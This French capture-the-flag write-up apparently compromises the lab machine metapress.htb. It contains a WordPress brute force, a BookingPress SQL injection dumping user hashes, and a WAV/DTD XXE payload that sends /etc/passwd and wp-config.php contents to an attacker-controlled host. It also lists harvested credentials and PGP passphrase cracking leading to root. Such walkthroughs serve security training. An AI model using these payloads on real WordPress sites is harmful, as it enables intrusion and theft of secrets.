```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 0 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 22:05 +0000
Nmap scan report for 10.129.228.95
Host is up (0.58s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   523.62 ms 10.10.14.1
2   523.73 ms 10.129.228.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 316.74 seconds
```

`Domaine : metapress.htb`
# Enumeration http

![](/assets/IMG-20260716221456960.png)

## Wordpress

### User enumeration

```js
wpscan -e p --url http://metapress.htb -t 100 -e u
```

```js
admin
manager
```

### Password Attack

```js
wpscan --password-attack xmlrpc -t 20 -U user.txt -P /usr/share/wordlists/rockyou.txt --url http://metapress.htb --api-token CWDkfvUj0UACC5L8jqPnOYrJMApXaa6Vl6sCMFHQAtA
```

### Apres avoir tenter un brute force avec la rockyou rien n'as marcher alors je suis partie inspecter le code source

#### Technologies identifiées

| Élément             | Version               | Remarque                       |
| ------------------- | --------------------- | ------------------------------ |
| WordPress           | 5.6.2                 | Ancienne, datant de début 2021 |
| Plugin BookingPress | 1.0.10                | Critique — voir ci-dessous     |
| Thème               | Twenty Twenty-One 1.1 | Sans intérêt direct            |
Apres qlque recherche sur google j'ai trouver que le plugin `BookingPress v1.0.10` est vuln a `CVE-2022-0739`

```js
Elle permet à un utilisateur non authentifié d'exécuter des requêtes SQL malveillantes en raison d'une mauvaise validation des données POST dans les requêtes AJAX
```

### PoC

```JS
- Demandes HTTP POST inhabituelles ou malformées à /wp-admin/admin-ajax.php avec action bookingpress_front_get_category_services
- syntaxe SQL ou mots-clés apparaissant dans les paramètres POST (par exemple, UNION, SELECT, OR 1=1, --, des citations uniques)
- Plusieurs requêtes rapides à partir d'une même adresse IP ciblant le point de terminaison BookingPress AJAX
- Journaux de requêtes de base de données affichant des requêtes inattendues ou des messages d'erreur liés à la syntaxe SQL
```

```js
https://github.com/viardant/CVE-2022-0739/blob/main/booking-sqlinjector.py
```


```js
python3 booking-sqlinjector.py -u http://metapress.htb  -n 0377eaf445  -p ") UNION ALL SELECT user_login,user_pass,NULL,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -" -o output
```

```js
[*] DB Fingerprint: 10.5.15-MariaDB-0+deb11u1
[*] Users found: 2
{
  "admin": {
    "email": "admin@metapress.htb",
    "password": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV."
  },
  "manager": {
    "email": "manager@metapress.htb",
    "password": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70"
  }
}
[
  [
    "admin",
    "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.",
    null,
    "$0.00",
    null,
    null,
    null,
    null,
    null,
    0,
    "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  ],
  [
    "manager",
    "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70",
    null,
    "$0.00",
    null,
    null,
    null,
    null,
    null,
    0,
    "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  ]
]

```

### Creds found

![](/assets/IMG-20260720005516225.png)

```js
admin@metapress.htb : not found
manager@metapress.htb : partylikearockstar
```

![](/assets/IMG-20260720005538271.png)

Apres etre connecter a la page admin et avoir fait qlq recherche j'ai trouver que le media library est vuln a `CVE-2021-29447`

```js
La **CVE-2021-29447** est une vulnérabilité critique de type **XXE** (XML External Entity) dans la bibliothèque de traitement des fichiers multimédias de WordPress. Elle permet à un utilisateur connecté avec des privilèges de téléchargement (comme un auteur) d'exploiter le site pour voler des fichiers internes ou attaquer d'autres réseaux
```

```js
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.15.154:9123/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

```js
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.15.154:9123/?p=%file;'>" >
```
Upload dans le ficher `evil.dtd`

lancer un serveur web

```js
php -S 0.0.0.0:9123
```

![](/assets/IMG-20260720020513246.png)

Extraction du contenu du `wp-config.php` en modifiant le evil.dtd

```js
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

## FTP Creds

```js
metapress.htb : 9NYS_ii@FyL_p5M2NvJ
```

![](/assets/IMG-20260720021957724.png)

### Recuperation d'un ficher contenant les creds SSH de l'utilisateur jnelson

![](/assets/IMG-20260720065447859.png)

```js
jnelson : Cb4_JmWM8zUZWMu@Ys
```

## User Flag : 403a2065f8e835b4db3ab2fe5bcff599

## Decouverte d'un gestionnaire de mot de passe passpie

**Passpie** est un gestionnaire de mots de passe en ligne de commande qui stocke les credentials chiffrés via PGP. On a trouvé dans `~/.passpie` :

|Fichier|Contenu|
|---|---|
|`.keys`|La clé PGP publique + **clé privée** du keyring de passpie|
|`ssh/root.pass`|Mot de passe root chiffré en PGP|
|`ssh/jnelson.pass`|Mot de passe jnelson chiffré en PGP|

La clé privée PGP est elle-même protégée par une **passphrase**. C'est ce qu'il faut cracker.

---

### La chaîne d'attaque

```js
Clé privée PGP  →  cracker la passphrase  →  déchiffrer root.pass  →  mot de passe root  →  SSH root
```
### Crackage de la cle pgp

![](/assets/IMG-20260720073239697.png)

```js
Pass : blink182
```

### Dechiffrement

```js
passpie export /tmp/creds.txt
```
passphrase : blink182

```js
cat /tmp/creds.txt
```

output
```js
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

## Root creds

```js
root : p7qfAZt4_A1xo_0x
```

connexion en tant que root

![](/assets/IMG-20260720074052468.png)
## Root Flag : 8aa0ad812df9686ebe36a02e80ad647b